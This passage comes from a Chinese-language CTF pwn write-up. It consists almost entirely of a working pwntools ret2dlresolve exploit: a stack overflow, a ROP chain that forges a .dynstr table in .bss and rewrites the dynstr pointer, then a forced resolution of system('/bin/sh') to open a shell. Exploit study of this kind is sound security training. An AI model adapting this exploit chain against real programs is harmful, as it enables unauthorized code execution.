![image-20240606161906570](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406061619623.png)

可以看到是这里来完成`dl_runtime`的触发。因此，我们只需要构建好参数后，将程序控制流劫持到这个地方，即可执行`system("/bin/sh")`。

到此，整个过程的`exp`为：

```python
from pwn import *

filename = './pwn'
context.arch='amd64'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

pop_rdi = 0x4011d3
pop_rsi_r15 = 0x4011d1
pop_rdx = 0x401136
offset = 0x108
dynstr_table_addr = 0x4031f0
fake_table = elf.bss() + 0x200
binsh_addr = elf.bss() + 0x300
start_resolve = 0x401020

dynstr_data = elf.get_section_by_name('.dynstr').data().replace(b'read', b'system')

# step 0: 在bss上构建一个fake dynstr table
payload = b'a'*0x108 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(fake_table) + p64(0xdeadbeaf) + p64(elf.plt['read'])
# step 1: 在bss上写一个binsh字符串，作为system函数参数
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(binsh_addr) + p64(0xdeadbeaf) + p64(elf.plt['read'])
# step 2: 修改dynamic中的dynstr字符串表，将其改为伪造的dynstr table的地址
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(dynstr_table_addr) + p64(0xdeadbeaf) + p64(elf.plt['read'])
# step 3: 给system添加参数后，手动触发_dl_runtime_resolve
payload += p64(pop_rdi) + p64(binsh_addr) + p64(start_resolve)

sh.send(payload)

sh.send(dynstr_data)
sh.send("/bin/sh\x00")
sh.send(p64(fake_table))
sh.interactive()
```





